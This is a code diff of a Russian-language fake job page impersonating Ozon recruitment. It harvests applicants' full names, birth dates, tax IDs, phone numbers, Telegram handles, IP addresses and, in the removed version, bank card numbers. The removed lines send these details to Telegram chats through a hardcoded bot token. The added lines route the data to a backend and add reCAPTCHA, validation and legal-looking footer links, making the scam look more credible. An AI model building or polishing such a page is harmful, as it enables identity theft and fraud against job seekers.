@@ -2,9 +2,12 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://www.google.com https://www.gstatic.com; style-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:;">
     <title>OZON Работа</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -405,8 +408,32 @@
         .transition-circle.active {
             transform: scale(5);
         }
-
-        /* Адаптация под мобильные устройства */
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #666;
+            transition: color 0.5s ease;
+        }
+        footer a {
+            color: #005BFF;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        .light footer {
+            color: #333;
+        }
+        .dark footer {
+            color: #B0C4DE;
+        }
+        .light footer a {
+            color: #003BB5;
+        }
+        .dark footer a {
+            color: #99C7FF;
+        }
         @media (max-width: 768px) {
             .container {
                 padding: 5px;
@@ -524,30 +551,33 @@
         <div class="main-banner">
             <div class="banner-text">
                 <h2>Работа в OZON</h2>
-                <p>От 80 000 до 100 000 ₽ в месяц</p>
+                <p>Зарплата от 80 000 ₽ в месяц при полной занятости</p>
                 <button onclick="openModal()">Стать работником</button>
             </div>
             <div class="banner-image">
-                <img src="hands.webp">
+                <img src="hands.webp" alt="Работа в OZON">
             </div>
         </div>
         <div class="features">
             <div class="feature">
-                <img src="money.png">
+                <img src="money.png" alt="Доход">
                 <h3>Стабильный доход</h3>
-                <p>Выполняйте работу и получайте деньги сразу после ее завершения</p>
+                <p>Получайте оплату сразу после выполнения работы</p>
             </div>
             <div class="feature">
-                <img src="gift.png">
+                <img src="gift.png" alt="Бонусы">
                 <h3>Дополнительный доход</h3>
-                <p>Получайте бонусы за заказы: до 50 000 ₽ за привлечение нового работника</p>
+                <p>Бонусы до 50 000 ₽ за привлечение новых работников</p>
             </div>
             <div class="feature">
-                <img src="clock.png">
+                <img src="clock.png" alt="Расписание">
                 <h3>Гибкое расписание</h3>
-                <p>Можно выполнять работу несколько часов в неделю</p>
+                <p>Работайте несколько часов в неделю по вашему графику</p>
             </div>
         </div>
+        <footer>
+            <p>© 2025 OZON Работа. <a href="/privacy.html">Политика конфиденциальности</a> | <a href="/terms.html">Условия использования</a> | Контакты: <a href="mailto:support@ozon.work">support@ozon.work</a></p>
+        </footer>
     </div>
 
     <div id="applicationModal" class="modal">
@@ -559,23 +589,22 @@
                 <label for="name">ФИО</label>
                 <input type="text" id="name" name="name" required placeholder="Введите ФИО">
 
-                <label for="card">Номер карты на личное имя</label>
-                <input type="text" id="card" name="card" required placeholder="Введите номер карты">
-
                 <label for="birthdate">Дата рождения (ДД.ММ.ГГГГ)</label>
-                <input type="text" id="birthdate" name="birthdate" required placeholder="Например, 01.01.1990">
+                <input type="text" id="birthdate" name="birthdate" required placeholder="Например, 01.01.1990" pattern="\d{2}\.\d{2}\.\d{4}">
 
                 <label for="inn">ИНН</label>
-                <input type="text" id="inn" name="inn" required placeholder="Введите ваш ИНН">
+                <input type="text" id="inn" name="inn" required placeholder="Введите ваш ИНН" pattern="\d{10,12}">
 
                 <label for="city">Город</label>
                 <input type="text" id="city" name="city" required placeholder="Введите ваш город">
 
                 <label for="telegram">Telegram (юзернейм)</label>
-                <input type="text" id="telegram" name="telegram" required placeholder="@username">
+                <input type="text" id="telegram" name="telegram" required placeholder="@username" pattern="@[A-Za-z0-9_]{5,}">
 
                 <label for="phone">Номер телефона</label>
-                <input type="text" id="phone" name="phone" required placeholder="+79999999999">
+                <input type="text" id="phone" name="phone" required placeholder="+79999999999" pattern="\+?[1-9]\d{10,14}">
+
+                <div class="g-recaptcha" data-sitekey="6Lf89CMrAAAAAFuTeqUp-XBsbwPUbUxxfoAU2odF"></div>
 
                 <button type="submit" id="submitButton">Далее</button>
             </form>
@@ -585,7 +614,7 @@
     <div id="notificationModal" class="notification">
         <div class="notification-content">
             <h3>Напишите менеджеру</h3>
-            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
+            <p>Свяжитесь с нашим менеджером в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
             <button id="doneButton" onclick="closeNotification()">Готово</button>
         </div>
     </div>
@@ -600,7 +629,6 @@
             return `#${timestamp}-${random}`;
         }
 
-        // Функция для определения платформы
         function detectPlatform() {
             const userAgent = navigator.userAgent.toLowerCase();
             if (/mobile|android|iphone|ipad|ipod|opera mini|webos|blackberry|windows phone/i.test(userAgent)) {
@@ -614,7 +642,6 @@
             }
         }
 
-        // Функция для получения IP-адреса
         async function getIpAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -638,6 +665,7 @@
         function closeModal() {
             document.getElementById('applicationModal').style.display = 'none';
             document.getElementById('applicationForm').reset();
+            grecaptcha.reset();
         }
 
         function showNotification() {
@@ -657,7 +685,6 @@
             }
         }
 
-        // Валидация Telegram-юзернейма
         document.getElementById('telegram').addEventListener('input', function (e) {
             const telegramInput = e.target;
             const telegramPattern = /^@[A-Za-z0-9_]{5,}$/;
@@ -668,7 +695,6 @@
             }
         });
 
-        // Валидация номера телефона
         document.getElementById('phone').addEventListener('input', function (e) {
             const phoneInput = e.target;
             const phonePattern = /^\+?[1-9]\d{10,14}$/;
@@ -676,6 +702,26 @@
                 phoneInput.setCustomValidity('Введите корректный номер телефона, например, +79999999999');
             } else {
                 phoneInput.setCustomValidity('');
+            }
+        });
+
+        document.getElementById('birthdate').addEventListener('input', function (e) {
+            const birthdateInput = e.target;
+            const birthdatePattern = /^\d{2}\.\d{2}\.\d{4}$/;
+            if (!birthdatePattern.test(birthdateInput.value)) {
+                birthdateInput.setCustomValidity('Введите дату в формате ДД.ММ.ГГГГ, например, 01.01.1990');
+            } else {
+                birthdateInput.setCustomValidity('');
+            }
+        });
+
+        document.getElementById('inn').addEventListener('input', function (e) {
+            const innInput = e.target;
+            const innPattern = /^\d{10,12}$/;
+            if (!innPattern.test(innInput.value)) {
+                innInput.setCustomValidity('Введите корректный ИНН (10 или 12 цифр)');
+            } else {
+                innInput.setCustomValidity('');
             }
         });
 
@@ -695,69 +741,42 @@
             const formData = new FormData(form);
             const data = {
                 name: formData.get('name'),
-                card: formData.get('card'),
                 birthdate: formData.get('birthdate'),
                 inn: formData.get('inn'),
                 city: formData.get('city'),
                 telegram: formData.get('telegram'),
-                phone: formData.get('phone')
+                phone: formData.get('phone'),
+                applicationId: generateApplicationId(),
+                ip: await getIpAddress(),
+                platform: detectPlatform(),
+                recaptcha: grecaptcha.getResponse()
             };
 
-            const applicationId = generateApplicationId();
-            const botToken = '7673113370:AAH2hS9rKjs6MPTgQofo0RbKbSUsMrDwcR8';
-            const adminChatIds = ['6817476091', '7409970440', '2079893058'];
-
-            // Получаем IP и платформу
-            const ipAddress = await getIpAddress();
-            const platform = detectPlatform();
-
-            const message = `
-Новая заявка на работу в OZON:
-🆔 ID заявки: ${applicationId}
-👤 ФИО: ${data.name}
-💳 Номер карты: ${data.card}
-📅 Дата рождения: ${data.birthdate}
-🆔 ИНН: ${data.inn}
-🏙 Город: ${data.city}
-📱 Telegram: ${data.telegram}
-📞 Номер телефона: ${data.phone}
-🌐 IP-адрес: ${ipAddress}
-💻 Платформа: ${platform}
-            `;
-
-            let allSuccessful = true;
-
-            for (const adminChatId of adminChatIds) {
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: adminChatId,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-
-                    const result = await response.json();
-                    if (!result.ok) {
-                        allSuccessful = false;
-                    }
-                } catch (error) {
-                    allSuccessful = false;
-                }
+            if (!data.recaptcha) {
+                alert('Пожалуйста, пройдите проверку reCAPTCHA.');
+                submitButton.disabled = false;
+                return;
             }
 
-            if (allSuccessful) {
-                if (!isAdmin) {
-                    localStorage.setItem('hasSubmitted', 'true');
+            try {
+                const response = await fetch('/api/send-application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    if (!isAdmin) {
+                        localStorage.setItem('hasSubmitted', 'true');
+                    }
+                    closeModal();
+                    showNotification();
+                } else {
+                    alert('Ошибка при отправке заявки. Попробуйте снова.');
+                    submitButton.disabled = false;
                 }
-                closeModal();
-                showNotification();
-            } else {
-                alert('Произошла ошибка при отправке заявки. Попробуйте снова.');
+            } catch (error) {
+                alert('Произошла ошибка. Пожалуйста, попробуйте позже.');
                 submitButton.disabled = false;
             }
         }
@@ -765,23 +784,23 @@
         function toggleTheme(theme, event) {
             const circle = document.createElement('div');
             circle.classList.add('transition-circle');
-            
+
             const x = event.clientX;
             const y = event.clientY;
             circle.style.left = `${x}px`;
             circle.style.top = `${y}px`;
-            
+
             const maxDimension = Math.max(window.innerWidth, window.innerHeight);
             circle.style.width = `${maxDimension}px`;
             circle.style.height = `${maxDimension}px`;
             circle.style.transform = 'translate(-50%, -50%) scale(0)';
-            
+
             document.body.appendChild(circle);
-            
+
             setTimeout(() => {
                 circle.classList.add('active');
             }, 10);
-            
+
             setTimeout(() => {
                 document.body.className = theme;
                 circle.remove();
@@ -789,4 +808,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
